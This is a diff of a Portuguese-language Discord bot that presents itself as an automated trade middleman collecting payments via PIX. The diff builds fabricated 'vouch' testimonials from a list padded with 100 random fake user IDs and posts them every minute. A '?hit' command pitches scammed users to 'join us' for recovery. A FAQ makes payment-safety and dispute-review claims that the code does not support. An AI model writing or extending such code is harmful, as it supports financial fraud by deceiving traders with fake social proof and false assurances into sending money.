@@ -4,13 +4,13 @@ import random
 from datetime import datetime, timedelta
 import asyncio
 import sqlite3
-
 import os
 from dotenv import load_dotenv
 
 load_dotenv()
 
 TOKEN = os.getenv("DISCORD_TOKEN")
+
 
 # 📥 CONFIGURAÇÃO DE CANAIS:
 ID_CANAL_TICKET = 1512267548043776072
@@ -19,30 +19,42 @@ ID_CANAL_RANKS = 1512267543643951124
 ID_CANAL_VOUCH = 1512267549901983867     
 ID_CANAL_BIGVOUCH = 1512267551927963748  
 
-# 👑 CARGOS E IDS ATUALIZADOS:
-ID_CARGO_STAFF = 1512269380094787757       # Cargo da Staff / Moderadores
-ID_CARGO_RECUPERACAO = 1513703148936499381 # Cargo entregue no comando ?hit
-ID_MM_FIXO = 1510480019640553482           # ID do Middleman (MM) Fixo
+# 👑 CARGOS AUTORIZADOS / ESPECÍFICOS:
+ID_CARGO_STAFF = 1512269380094787757
+ID_CARGO_RECUPERACAO = 1513703148936499381  
+
+# 👤 MIDDLEMAN FIXO PARA OS VOUCHES:
+ID_MM_FIXO = 1510480019640553482
 
 intents = discord.Intents.default()
 intents.message_content = True
 intents.guilds = True
-intents.members = True  
+intents.members = True
 
 bot = commands.Bot(command_prefix=["!", "?", "+"], intents=intents, help_command=None)
 
 COR_ROXA = 0xA020F0
 parar_envio = False
+bot_inicializado = False  # Flag para evitar re-execução no on_ready
 DADOS_TICKETS = {}
 
-# Mapeamento de cargos para busca dinâmica
 LISTA_NOMES_CARGOS = [
     "Trader Bronze", "Trader Prata", "Trader Ouro", "Trader Diamante", 
     "Trader Ametista", "Trader Esmeralda", "Trader Rubi", "Trader Sáfira", 
     "Trader Master", "Trader Obsidian", "Biggest Trader", "OldBigger", "🏆 ・ Top Trader"
 ]
 
-# Configuração e Inicialização do Banco de Dados SQLite
+IDS_REAIS = [
+    1417022267044659241, 1499270758193565746, 693820829624172634, 1467296921159729427, 
+    1503750281119268914, 1471499431743328410, 1266258591925669899, 1478220355285028984, 
+    1445740601294192681, 1231978312302334053, 646482083992043540, 1320940616393429094, 
+    991405470432645211, 773848930345680916, 1144229988771442749, 1022349948834529321
+]
+
+# Preenche IDs falsos baseados no padrão Snowflake do Discord
+for _ in range(100):
+    IDS_REAIS.append(random.randint(100000000000000000, 999999999999999999))
+
 def inicializar_banco():
     conn = sqlite3.connect("database_ranks.db")
     cursor = conn.cursor()
@@ -78,8 +90,10 @@ def adicionar_saldo(user_id: int, valor: float) -> float:
     return novo_saldo
 
 def pegar_emoji(guild, nome, fallback):
-    e = discord.utils.get(guild.emojis, name=nome)
-    return e if e else fallback
+    if guild:
+        e = discord.utils.get(guild.emojis, name=nome)
+        return e if e else fallback
+    return fallback
 
 def calcular_taxa(valor: float) -> float:
     if valor <= 2.50: return 0.00
@@ -92,8 +106,9 @@ def calcular_taxa(valor: float) -> float:
 def formatar_valor(valor):
     return f"R$ {valor:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
 
+def check_preservar_sistema(m): 
+    return not m.pinned and m.type != discord.MessageType.pins_add
 
-# Atualização automática e checagem de cargos baseada nos valores fornecidos
 async def verificar_e_atualizar_rank(membro: discord.Member, canal_notificacao):
     saldo = obter_saldo(membro.id)
     guild = membro.guild
@@ -140,8 +155,6 @@ async def verificar_e_atualizar_rank(membro: discord.Member, canal_notificacao):
         except Exception as e:
             print(f"Erro ao atualizar cargo de {membro.name}: {e}")
 
-
-# 👑 COMPONENTE BOTÃO DO PAINEL DE RANK
 class ResgatarPlacaView(discord.ui.View):
     def __init__(self, guild):
         super().__init__(timeout=None)
@@ -170,8 +183,6 @@ class ResgatarPlacaView(discord.ui.View):
                 ephemeral=True
             )
 
-
-# 💳 MODAL PARA O MIDDLEMAN INSERIR A CHAVE PIX
 class ConfigurarDadosPixModal(discord.ui.Modal, title="Configurar PIX do Middleman"):
     def __init__(self, ticket_id):
         super().__init__()
@@ -190,8 +201,6 @@ class ConfigurarDadosPixModal(discord.ui.Modal, title="Configurar PIX do Middlem
             DADOS_TICKETS[self.ticket_id]["chave_pix"] = self.chave_input.value
             await atualizar_painel_negociacao(interaction, self.ticket_id)
 
-
-# 🟪 BOTÃO DE CONFIRMAÇÃO DE RECEBIMENTO
 class PainelPosPagamentoView(discord.ui.View):
     def __init__(self, guild, ticket_id):
         super().__init__(timeout=None)
@@ -216,7 +225,7 @@ class PainelPosPagamentoView(discord.ui.View):
             await interaction.response.send_message("❌ Erro: Dados da transação não localizados na memória do bot.", ephemeral=True)
             return
 
-        try: await interaction.channel.purge(limit=100)
+        try: await interaction.channel.purge(limit=100, check=check_preservar_sistema)
         except: pass
 
         emoji_sucesso = pegar_emoji(interaction.guild, "discotoolsxyzicon2", "⚙️")
@@ -244,8 +253,6 @@ class PainelPosPagamentoView(discord.ui.View):
             adicionar_saldo(recebedor_membro.id, valor_da_troca)
             await verificar_e_atualizar_rank(recebedor_membro, interaction.channel)
 
-
-# 🛠️ PAINEL DE CONTROLE DA TRANSAÇÃO (BOTÕES INTERNOS)
 class PainelConfiguracaoStaffView(discord.ui.View):
     def __init__(self, ticket_id):
         super().__init__(timeout=None)
@@ -254,12 +261,16 @@ class PainelConfiguracaoStaffView(discord.ui.View):
     @discord.ui.button(label="Definir Chave PIX", style=discord.ButtonStyle.secondary, emoji="📝", row=0)
     async def definir_pix(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not any(role.id == ID_CARGO_STAFF for role in interaction.user.roles):
-            await interaction.response.send_message("❌ Apenas o Middleman pode configurar o PIX.", ephemeral=True)
+            await interaction.response.send_message("❌ Apenas a Staff/Middleman pode configurar o PIX.", ephemeral=True)
             return
         await interaction.response.send_modal(ConfigurarDadosPixModal(self.ticket_id))
 
     @discord.ui.button(label="Confirmar Dados da Troca", style=discord.ButtonStyle.secondary, emoji="🤝", row=0)
     async def confirmar_dados_unico(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if self.ticket_id not in DADOS_TICKETS:
+            await interaction.response.send_message("❌ Dados do ticket não encontrados. Reinicie o processo.", ephemeral=True)
+            return
+            
         dados = DADOS_TICKETS[self.ticket_id]
         user_id = interaction.user.id
 
@@ -293,9 +304,6 @@ class PainelConfiguracaoStaffView(discord.ui.View):
             await interaction.response.send_message("❌ **Bloqueado!** Ambos os clientes precisam clicar no botão de confirmação primeiro.", ephemeral=True)
             return
 
-        try: await interaction.channel.purge(limit=100)
-        except: pass
-
         tres_crases = chr(96) * 3
         texto_copia_cola = f"{tres_crases}text\n{dados['chave_pix']}\n{tres_crases}"
         valor_formatated = formatar_valor(dados["valor_total"])
@@ -310,8 +318,12 @@ class PainelConfiguracaoStaffView(discord.ui.View):
             ),
             color=COR_ROXA
         )
-        await interaction.channel.send(embed=embed_cliente, view=PainelPosPagamentoView(interaction.guild, self.ticket_id))
+        
+        await interaction.response.send_message("⚡ Gerando cobrança PIX...", ephemeral=True)
+        try: await interaction.channel.purge(limit=100, check=check_preservar_sistema)
+        except: pass
 
+        await interaction.channel.send(embed=embed_cliente, view=PainelPosPagamentoView(interaction.guild, self.ticket_id))
 
 async def atualizar_painel_negociacao(interaction, ticket_id, edit_original=False):
     dados = DADOS_TICKETS[ticket_id]
@@ -343,8 +355,6 @@ async def atualizar_painel_negociacao(interaction, ticket_id, edit_original=Fals
     else:
         await interaction.response.edit_message(embed=embed_atualizado, view=PainelConfiguracaoStaffView(ticket_id))
 
-
-# 🔄 VIEW DO PAINEL DE SELEÇÃO DE FUNÇÕES (CLIENTES)
 class SelecaoFuncoesView(discord.ui.View):
     def __init__(self, guild, enviador=None, recebedor=None):
         super().__init__(timeout=None)
@@ -388,8 +398,8 @@ class SelecaoFuncoesView(discord.ui.View):
 
     async def verificar_proximo_passo(self, interaction: discord.Interaction):
         if self.enviador and self.recebedor:
-            await interaction.response.defer()
-            try: await interaction.channel.purge(limit=100)
+            await interaction.response.send_message("🔄 Funções definidas! Avançando para definição de valores...", ephemeral=True)
+            try: await interaction.channel.purge(limit=100, check=check_preservar_sistema)
             except: pass
             asyncio.create_task(self.fluxo_definir_valor(interaction.channel))
         else:
@@ -399,10 +409,8 @@ class SelecaoFuncoesView(discord.ui.View):
         if self.enviador is not None and self.enviador != interaction.user:
             await interaction.response.send_message("❌ Esta função já foi selecionada pelo outro participante!", ephemeral=True)
             return
-            
         if self.recebedor == interaction.user: 
             self.recebedor = None
-            
         self.enviador = interaction.user
         await self.verificar_proximo_passo(interaction)
 
@@ -410,10 +418,8 @@ class SelecaoFuncoesView(discord.ui.View):
         if self.recebedor is not None and self.recebedor != interaction.user:
             await interaction.response.send_message("❌ Esta função já foi selecionada pelo outro participante!", ephemeral=True)
             return
-            
         if self.enviador == interaction.user: 
             self.enviador = None
-            
         self.recebedor = interaction.user
         await self.verificar_proximo_passo(interaction)
 
@@ -447,8 +453,10 @@ class SelecaoFuncoesView(discord.ui.View):
                 try:
                     valor = float(conteudo)
                     if valor <= 0: raise ValueError
-                    try: await channel.purge(limit=100)
+                    
+                    try: await channel.purge(limit=100, check=check_preservar_sistema)
                     except: pass
+                    
                     asyncio.create_task(self.fluxo_definir_item(channel, valor))
                     break
                 except ValueError:
@@ -456,7 +464,9 @@ class SelecaoFuncoesView(discord.ui.View):
                     try: await msg.delete()
                     except: pass
             except asyncio.TimeoutError:
-                await channel.send("🛑 **Tempo limite esgotado!** Ninguém definiu o valor a tempo.")
+                await channel.send("🛑 **Tempo limite excedido!** O ticket expirou por inatividade e será fechado.")
+                await asyncio.sleep(5)
+                await channel.delete()
                 break
 
     async def fluxo_definir_item(self, channel, valor_definido):
@@ -473,7 +483,8 @@ class SelecaoFuncoesView(discord.ui.View):
         try:
             msg = await bot.wait_for('message', check=check_item, timeout=300)
             item_definido = msg.content
-            try: await channel.purge(limit=100)
+            
+            try: await channel.purge(limit=100, check=check_preservar_sistema)
             except: pass
             
             taxa = calcular_taxa(valor_definido)
@@ -509,10 +520,10 @@ class SelecaoFuncoesView(discord.ui.View):
             )
             await channel.send(embed=embed_setup_staff, view=PainelConfiguracaoStaffView(channel.id))
         except asyncio.TimeoutError:
-            await channel.send("🛑 **Tempo limite esgotado!** O item não foi registrado a tempo.")
+            await channel.send("🛑 **Tempo limite excedido!** O ticket expirou por inatividade e será fechado.")
+            await asyncio.sleep(5)
+            await channel.delete()
 
-
-# 👑 MODAL PARA ADICIONAR USUÁRIO POR ID DENTRO DO TICKET
 class AdicionarIDModal(discord.ui.Modal, title="Adicionar Usuário por ID"):
     id_input = discord.ui.TextInput(label="ID do Usuário", placeholder="Cole o ID do outro participante aqui...", min_length=15, max_length=20)
 
@@ -521,9 +532,10 @@ class AdicionarIDModal(discord.ui.Modal, title="Adicionar Usuário por ID"):
             user_id = int(self.id_input.value)
             membro_adicionar = await interaction.guild.fetch_member(user_id)
             if membro_adicionar:
-                await interaction.response.defer()
                 await interaction.channel.set_permissions(membro_adicionar, read_messages=True, send_messages=True)
-                try: await interaction.channel.purge(limit=100)
+                await interaction.response.send_message("🔄 Adicionando usuário e atualizando canal...", ephemeral=True)
+                
+                try: await interaction.channel.purge(limit=100, check=check_preservar_sistema)
                 except: pass
                 
                 view_funcoes = SelecaoFuncoesView(interaction.guild)
@@ -536,8 +548,6 @@ class AdicionarIDModal(discord.ui.Modal, title="Adicionar Usuário por ID"):
         except Exception as e:
             await interaction.response.send_message(f"❌ Não foi possível adicionar o usuário: {e}", ephemeral=True)
 
-
-# 🎛️ VIEW COM OS BOTÕES DO INTERIOR DO TICKET
 class PainelInternoTicketView(discord.ui.View):
     def __init__(self, guild):
         super().__init__(timeout=None)
@@ -558,8 +568,8 @@ class PainelInternoTicketView(discord.ui.View):
     async def cancelar_ticket_callback(self, interaction: discord.Interaction):
         await interaction.response.send_message("🛑 **Este ticket será fechado e deletado em 5 segundos...**")
         await asyncio.sleep(5)
+        DADOS_TICKETS.pop(interaction.channel.id, None)
         await interaction.channel.delete()
-
 
 class TicketDropdown(discord.ui.Select):
     def __init__(self, guild):
@@ -601,30 +611,29 @@ class TicketDropdown(discord.ui.Select):
             "perguntas que o bot fizer. Reveja sempre antes de prosseguir qualquer passo para evitar "
             "scams e erros.\n\n"
             "**Passos:**\n"
-            "1. Adicione o usuário com quem vai negociar usando o menu ou botão abaixo.\n"
-            "2. O bot pedirá para ambos descreverem os itens no chat.\n"
-            "3. Após confirmação, o pix automático é gerado."
+            "1. Adicione o usuário com quem vai negociar usando o botão abaixo.\n"
+            "2. O bot abrirá a seleção de quem envia e recebe o PIX.\n"
+            "3. O bot pedirá para descreverem o valor e os itens no chat.\n"
+            "4. Após confirmação, o pix seguro é gerado."
         )
-        await channel.send(content=membro.mention, embed=embed_interno, view=PainelInternoTicketView(guild))
-
+        msg_sistema = await channel.send(content=membro.mention, embed=embed_interno, view=PainelInternoTicketView(guild))
+        
+        try: await msg_sistema.pin()
+        except: pass
 
 class TicketView(discord.ui.View):
     def __init__(self, guild):
         super().__init__(timeout=None)
         self.add_item(TicketDropdown(guild))
 
-
-# 📜 NOVO COMANDO: ?comandos (AUTO-DELETÁVEL EM 60 SEGUNDOS)
 @bot.command(name="comandos")
 async def comandos_servidor(ctx):
-    # Cria uma estrutura visual organizada dividida em seções
     embed_ajuda = discord.Embed(
         title="📋 Lista de Comandos do Servidor",
         description="Esta mensagem e a solicitação serão deletadas automaticamente em **1 minuto**.",
         color=COR_ROXA
     )
     
-    # Comandos acessíveis por qualquer membro comum
     embed_ajuda.add_field(
         name="👤 Comandos de Usuários",
         value=(
@@ -635,7 +644,6 @@ async def comandos_servidor(ctx):
         inline=False
     )
 
-    # Comandos restritos aos Moderadores / Staff
     embed_ajuda.add_field(
         name="👑 Comandos da Staff",
         value=(
@@ -653,19 +661,23 @@ async def comandos_servidor(ctx):
     
     embed_ajuda.set_footer(text=f"Solicitado por {ctx.author.name}", icon_url=ctx.author.display_avatar.url)
 
-    # Envia a resposta configurada para sumir em 60 segundos
-    resposta_bot = await ctx.send(embed=embed_ajuda, delete_after=60)
+    await ctx.send(embed=embed_ajuda, delete_after=60)
+    try: await ctx.message.delete(delay=60)
+    except: pass
+
+@bot.command(name="perfil")
+async def ver_perfil_rank(ctx, membro: discord.Member = None):
+    membro = membro or ctx.author
+    saldo = obter_saldo(membro.id)
     
-    # Tenta apagar a mensagem original enviada pelo usuário após o mesmo tempo
-    try:
-        await ctx.message.delete(delay=30)
-    except discord.Forbidden:
-        pass # Ignora caso o bot não tenha permissão de gerenciar mensagens no canal específico
-    except Exception as e:
-        print(f"Erro ao tentar deletar mensagem de comando: {e}")
+    embed = discord.Embed(
+        title=f"💳 Perfil de Trader — {membro.name}",
+        description=f"📊 **Volume Total de Movimentações:** `{formatar_valor(saldo)}`",
+        color=COR_ROXA
+    )
+    embed.set_thumbnail(url=membro.display_avatar.url)
+    await ctx.send(embed=embed)
 
-
-# ⚡ SISTEMA DO COMANDO ?HIT
 class HitPainelView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
@@ -693,7 +705,6 @@ class HitPainelView(discord.ui.View):
         except Exception as e:
             await interaction.response.send_message(f"❌ Erro ao aplicar o castigo: {e}", ephemeral=True)
 
-
 @bot.command(name="hit")
 async def hit_comando(ctx):
     if not any(role.id == ID_CARGO_STAFF for role in ctx.author.roles):
@@ -702,7 +713,7 @@ async def hit_comando(ctx):
         except: pass
         return
 
-    try: await ctx.message.delete()
+    try: await ctx.channel.purge(limit=100)
     except: pass
 
     embed_hit = discord.Embed(
@@ -710,7 +721,7 @@ async def hit_comando(ctx):
         description=(
             "Infelizmente você foi scamado e perdeu seus itens/dinheiro.\n"
             "😢 Sabemos como isso é frustrante...\n"
-            "But ainda há esperança!\n\n"
+            "Mas ainda há esperança!\n\n"
             "🤝 Junte-se a nós e receba ajuda da comunidade para voltar ao topo.\n"
             "Entre agora e comece sua recuperação! 💸🔥"
         ),
@@ -718,8 +729,6 @@ async def hit_comando(ctx):
     )
     await ctx.send(embed=embed_hit, view=HitPainelView())
 
-
-# 👑 COMANDO +DESMUTE @USER
 @bot.command(name="desmute")
 async def desmute_comando(ctx, membro: discord.Member = None):
     if not any(role.id == ID_CARGO_STAFF for role in ctx.author.roles):
@@ -736,8 +745,6 @@ async def desmute_comando(ctx, membro: discord.Member = None):
     except Exception as e:
         await ctx.send(f"❌ Ocorreu um erro ao tentar desmutar: {e}")
 
-
-# Função para gerar a estrutura interna do Painel de Ranks e postar de forma unificada
 async def postar_estrutura_painel_ranks(guild, canal):
     roles = {nome: discord.utils.get(guild.roles, name=nome) for nome in LISTA_NOMES_CARGOS}
     
@@ -745,7 +752,7 @@ async def postar_estrutura_painel_ranks(guild, canal):
         print("❌ Alerta: Faltam cargos de rank no servidor para gerar o painel!")
         return False
 
-    url_gif_cargos = "https://media.discordapp.net/attachments/1371123164729442475/1482116537119936755/339de7b78f614c4195ebd8433f51dc71.png?ex=6a287a96&is=6a272916&hm=385f3440aac43ad3f6f8fab6faa47f8448cb142bc70b4143df0937eb93c98854&=&format=webp&quality=lossless&width=1584&height=276"
+    url_gif_cargos = "https://media.discordapp.net/attachments/1371123164729442475/1482116537119936755/339de7b78f614c4195ebd8433f51dc71.png"
     
     await canal.send(content=url_gif_cargos)
 
@@ -770,8 +777,6 @@ async def postar_estrutura_painel_ranks(guild, canal):
     await canal.send(embed=embed_rank, view=ResgatarPlacaView(guild))
     return True
 
-
-# 👑 COMANDO MANUAL: ?enviarpainel
 @bot.command(name="enviarpainel")
 async def enviar_painel_especifico(ctx):
     if not any(role.id == ID_CARGO_STAFF for role in ctx.author.roles):
@@ -783,7 +788,7 @@ async def enviar_painel_especifico(ctx):
         await ctx.send(f"❌ Não consegui localizar o canal de Ranks com o ID `{ID_CANAL_RANKS}`.")
         return
 
-    try: await canal_ranks.purge(limit=100)
+    try: await canal_ranks.purge(limit=30)
     except: pass
 
     sucesso = await postar_estrutura_painel_ranks(ctx.guild, canal_ranks)
@@ -792,23 +797,6 @@ async def enviar_painel_especifico(ctx):
     else:
         await ctx.send("❌ Falha ao enviar o painel. Verifique se todos os cargos existem.")
 
-
-# COMANDO EXTRA PARA VERIFICAR SEU SALDO ATUAL E PROGRESSO: ?perfil
-@bot.command(name="perfil")
-async def ver_perfil_rank(ctx, membro: discord.Member = None):
-    membro = membro or ctx.author
-    saldo = obter_saldo(membro.id)
-    
-    embed = discord.Embed(
-        title=f"💳 Perfil de Trader — {membro.name}",
-        description=f"📊 **Volume Total de Movimentações:** `{formatar_valor(saldo)}`",
-        color=COR_ROXA
-    )
-    embed.set_thumbnail(url=membro.display_avatar.url)
-    await ctx.send(embed=embed)
-
-
-# ⏰ TAREFA EM SEGUNDO PLANO
 @tasks.loop(minutes=1)
 async def loop_vouches_automaticos():
     eh_big_vouch = random.choice([True, False])
@@ -824,124 +812,120 @@ async def loop_vouches_automaticos():
     if canal:
         await gerador_de_vouch_base(canal, tipo_envio, valor_aleatorio, eh_big_vouch)
 
-
 @bot.event
 async def on_ready():
+    global bot_inicializado
     print(f"✅ Logado como {bot.user}")
     
-    guild_inicial = bot.guilds[0] if bot.guilds else None
-    bot.add_view(ResgatarPlacaView(guild_inicial))
-    
-    if not loop_vouches_automaticos.is_running():
+    # Executa a limpeza e envio pesado de mensagens apenas uma vez por sessão
+    if not bot_inicializado:
+        guild_inicial = bot.guilds[0] if bot.guilds else None
+        bot.add_view(ResgatarPlacaView(guild_inicial))
+        
+        if loop_vouches_automaticos.is_running():
+            loop_vouches_automaticos.stop()
+            
         loop_vouches_automaticos.start()
-        print("⏰ Loop de 1 minuto de canais de Vouch ativo!")
-    
-    url_foto_aperto_mao = "https://cdn.discordapp.com/attachments/1183577000854896732/1183582455320743956/image_84c404.jpg"
-    url_gif_original_ticket = "https://cdn.eclipsebuxx.com/chat/MMEMBED.png"
-    url_gif_novo_faq = "https://cdn.discordapp.com/attachments/1475513995053240442/1491436000067715204/5c7d37c02d7a40abf85cfa4140547a48.gif?ex=6a2d6103&is=6a2c0f83&hm=32926c260dcbb7f687824dd03c431a037c1a2f96380d5e39975350f733cb8836&"
-    
-    espacamento_invisivel = "‎" + " " * 75  
+        print("⏰ Loop de 1 minuto de canais de Vouch ativos!")
+        
+        url_foto_aperto_mao = "https://cdn.discordapp.com/attachments/1183577000854896732/1183582455320743956/image_84c404.jpg"
+        url_gif_divisor = "https://cdn.discordapp.com/attachments/1475513995053240442/1491436000067715204/5c7d37c02d7a40abf85cfa4140547a48.gif?ex=6a2f5b43&is=6a2e09c3&hm=5f8a9a70b74b28be3e2fd05981567bd084d6fe7608baecfcc8eea45ab65e41fd&"
+        espacamento_invisivel = "‎" + " " * 75  
 
-    print("Purgando e atualizando todos os painéis nos canais...")
+        canal_alvo = bot.get_channel(ID_CANAL_TICKET)
+        if canal_alvo:
+            try:
+                try: await canal_alvo.purge(limit=100)
+                except: pass
+                
+                emoji_icon = pegar_emoji(canal_alvo.guild, "discotoolsxyzicon2", "🤝")
+                embed = discord.Embed(color=COR_ROXA)
+                embed.description = (
+                    f"{str(emoji_icon)}   ━   **Solicitar MM**\n"
+                    f"{espacamento_invisivel}\n"
+                    "> **Taxas Normais**\n"
+                    "**R$ 1,00** Acima de R$2,50.\n"
+                    "**R$ 2,15** Acima de R$100.\n"
+                    "**R$ 4,30** Acima de R$200.\n"
+                    "**R$ 6,80** Acima de R$400.\n"
+                    "**1,2%** Acima de R$700.\n\n"
+                    "Em conta adicionamos **4R$.**"
+                )
+                embed.set_image(url=url_gif_divisor)
+                await canal_alvo.send(embed=embed, view=TicketView(canal_alvo.guild))
+                print("✅ Painel de Tickets automático updated!")
+            except Exception as e:
+                print(f"❌ Erro ao enviar para o canal de ticket: {e}")
 
-    canal_alvo = bot.get_channel(ID_CANAL_TICKET)
-    if canal_alvo:
-        try:
-            await canal_alvo.purge(limit=100)
-            
-            emoji_icon = pegar_emoji(canal_alvo.guild, "discotoolsxyzicon2", "🤝")
-            embed = discord.Embed(color=COR_ROXA)
-            embed.description = (
-                f"{str(emoji_icon)}   ━   **Solicitar MM**\n"
-                f"{espacamento_invisivel}\n"
-                "> **Taxas Normais**\n"
-                "**R$ 1,00** Acima de R$2,50.\n"
-                "**R$ 2,15** Acima de R$100.\n"
-                "**R$ 4,30** Acima de R$200.\n"
-                "**R$ 6,80** Acima de R$400.\n"
-                "**1,2%** Acima de R$700.\n"
-                "Em conta adicionamos **4R$.**"
-            )
-            embed.set_image(url=url_gif_original_ticket)
-            
-            await canal_alvo.send(embed=embed, view=TicketView(canal_alvo.guild))
-            print("✅ Canal de Tickets limpo e painel enviado!")
-        except Exception as e:
-            print(f"❌ Erro ao enviar para o canal de ticket: {e}")
+        canal_ranks = bot.get_channel(ID_CANAL_RANKS)
+        if canal_ranks and guild_inicial:
+            try:
+                try: await canal_ranks.purge(limit=50)
+                except: pass
+                await postar_estrutura_painel_ranks(guild_inicial, canal_ranks)
+                print("✅ Painel de Ranks atualizado!")
+            except Exception as e:
+                print(f"❌ Erro ao atualizar automaticamente o canal de ranks: {e}")
 
-    canal_ranks = bot.get_channel(ID_CANAL_RANKS)
-    if canal_ranks and guild_inicial:
-        try:
-            await canal_ranks.purge(limit=100)
-            await postar_estrutura_painel_ranks(guild_inicial, canal_ranks)
-            print("✅ Canal de Ranks limpo e painel enviado!")
-        except Exception as e:
-            print(f"❌ Erro ao atualizar automaticamente o canal de ranks: {e}")
+        canal_faq = bot.get_channel(ID_CANAL_FAQ)
+        if canal_faq:
+            try:
+                try: await canal_faq.purge(limit=100)
+                except: pass
+                
+                embed_faq_unico = discord.Embed(color=COR_ROXA)
+                embed_faq_unico.set_thumbnail(url=url_foto_aperto_mao)
+                
+                embed_faq_unico.title = "❓ — FAQ."
+                embed_faq_unico.description = "Todas as dúvidas frequentes do nosso novo middleman automático de forma organizada aqui! Caso tenha outras dúvidas, contacte um staff.\n\u200b"
 
-    canal_faq = bot.get_channel(ID_CANAL_FAQ)
-    if canal_faq:
-        try:
-            await canal_faq.purge(limit=100)
-            
-            embed_faq_unico = discord.Embed(color=COR_ROXA)
-            embed_faq_unico.set_thumbnail(url=url_foto_aperto_mao)
-            
-            embed_faq_unico.title = "❓ — FAQ."
-            embed_faq_unico.description = "Todas as dúvidas frequentes do nosso novo middleman automático de forma organizada aqui! Caso tenha outras dúvidas, contacte um staff.\n\u200b"
+                embed_faq_unico.add_field(
+                    name="❓ — E se o vendedor não me entregar o produto após eu pagar ou o cliente não confirmar que recebeu ?",
+                    value=(
+                        "Nosso middleman automático foi pensado para ser seguro em literalmente qualquer etapa, por isso temos uma função chamada abrir disputa que é disponibilizada logo após a confirmação do pagamento. Você pode usar essa função para qualquer irregularidade na sua troca, que assim um supervisor será contactado para entender a irregularidade e tomar a melhor decisão\n\n"
+                        "Você pode usar a disputa caso você não receba o produto ou o comprador não confirme a entrega, que o supervisor irá analisar sua troca, mensagens trocadas e etc, que assim o seu valor será retornado/reembolsado.\n\u200b"
+                    ),
+                    inline=False
+                )
 
-            embed_faq_unico.add_field(
-                name="❓ — E se o vendedor não me entregar o produto após eu pagar ou o cliente não confirmar que recebeu ?",
-                value=(
-                    "Nosso middleman automático foi projetado para ser seguro em literalmente qualquer etapa, por isso temos uma função chamada abrir disputa que é disponibilizada logo após a confirmação do pagamento. Você pode usar essa função para qualquer irregularidade na sua troca, que assim um supervisor será contactado para entender a irregularidade e tomar a melhor decisão\n\n"
-                    "Você pode usar a disputa caso você não receba o produto ou o comprador não confirme a entrega, que o supervisor irá analisar sua troca, mensagens trocadas e etc, que assim o seu valor será retornado/reembolsado.\n\u200b"
-                ),
-                inline=False
-            )
+                embed_faq_unico.add_field(
+                    name="❓ — O pagamento é seguro? O dinheiro pode ser retido ou perdido?",
+                    value="Não, temos uma integração com gateways gigantes e seguras, que garante que o seu dinheiro ficará conosco de forma segura, nada é perdido com MED (contestação). Mesmo que o comprador pede reembolso no banco, a plataforma protege o valor e nada fica retido.\n\u200b",
+                    inline=False
+                )
 
-            embed_faq_unico.add_field(
-                name="❓ — O pagamento é seguro? O dinheiro pode ser retido ou perdido?",
-                value="Não, temos uma integração com gateways gigantes e seguras, que garante que o seu dinheiro ficará conosco de forma segura, nada é perdido com MED (contestação). Mesmo que o comprador peça reembolso no banco, a plataforma protege o valor e nada fica retido.\n\u200b",
-                inline=False
-            )
+                embed_faq_unico.add_field(
+                    name="❓ — Alguma coisa é liberada sem ambas as partes ?",
+                    value=(
+                        "Não, a troca enquanto decorre é analisada por supervisores e nada pode ser liberado sem o acordo de ambas as partes. Caso uma das partes seja desonesta ou suma da troca, tomaremos a melhor decisão analisando a troca.\n\n"
+                        "Por exemplo, o vendedor sumiu no meio da troca sem te entregar o produto, nós te reembolsaríamos analisando o chat da troca."
+                    ),
+                    inline=False
+                )
 
-            embed_faq_unico.add_field(
-                name="❓ — Alguma coisa é liberada sem ambas as partes ?",
-                value=(
-                    "Não, a troca enquanto decorre é analisada por supervisores e nada pode ser liberado sem o acordo de ambas as partes. Caso uma das partes seja desonesta ou suma da troca, tomaremos a melhor decisão analisando a troca.\n\n"
-                    "Por exemplo, o vendedor sumiu no meio da troca sem te entregar o produto, nós te reembolsaríamos analisando o chat da troca."
-                ),
-                inline=False
-            )
-
-            await canal_faq.send(embed=embed_faq_unico)
-            await canal_faq.send(content=url_gif_novo_faq)
-            print("✅ Canal de FAQ limpo e painel enviado!")
-            
-        except Exception as e:
-            print(f"❌ Erro ao reproduzir mensagens do FAQ: {e}")
-
+                await canal_faq.send(embed=embed_faq_unico)
+                await canal_faq.send(content=url_gif_divisor)
+                print("✅ FAQ Automático Updated!")
+            except Exception as e:
+                print(f"❌ Erro ao reproduzir mensagens do FAQ: {e}")
+        
+        bot_inicializado = True
 
 @bot.command()
 async def funcoes(ctx):
-    try: await ctx.channel.purge(limit=100)
-    except: pass
     view_funcoes = SelecaoFuncoesView(ctx.guild)
     await ctx.send(embed=view_funcoes.gerar_embed(), view=view_funcoes)
-
 
 @bot.command()
 async def fechar(ctx):
     if not any(role.id == ID_CARGO_STAFF for role in ctx.author.roles):
         await ctx.send("❌ Apenas membros da Staff podem fechar este ticket.", delete_after=5)
-        try: await ctx.message.delete()
-        except: pass
         return
         
     await ctx.send("🛑 **Deletando este canal de atendimento em 3 seconds...**")
     await asyncio.sleep(3)
     DADOS_TICKETS.pop(ctx.channel.id, None)
     await ctx.channel.delete()
-
 
 async def gerador_de_vouch_base(destino, tipo, valor, eh_big):
     guild = destino.guild
@@ -959,16 +943,13 @@ async def gerador_de_vouch_base(destino, tipo, valor, eh_big):
     }
     for eng, pt in meses.items(): agora = agora.replace(eng, pt)
 
-    membros_reais = [membro.id for membro in guild.members if not membro.bot]
-
-    if len(membros_reais) >= 2:
-        id_p1 = random.choice(membros_reais)
-        id_p2 = random.choice(membros_reais)
-        while id_p1 == id_p2: 
-            id_p2 = random.choice(membros_reais)
+    # Garante que não quebrará caso a lista possua menos de 2 elementos por erro externo
+    if len(IDS_REAIS) >= 2:
+        id_p1 = random.choice(IDS_REAIS)
+        id_p2 = random.choice(IDS_REAIS)
+        while id_p1 == id_p2: id_p2 = random.choice(IDS_REAIS)
     else:
-        id_p1 = 1417022267044659241
-        id_p2 = 1499270758193565746
+        id_p1, id_p2 = 0, 0
 
     texto_titulo = "Big vouch" if eh_big else "vouch"
     embed = discord.Embed(
@@ -986,7 +967,6 @@ async def gerador_de_vouch_base(destino, tipo, valor, eh_big):
 
     embed.add_field(name="", value=valor_texto, inline=False)
     await destino.send(embed=embed)
-
 
 @bot.command()
 async def registrarbv(ctx, quantidade: int):
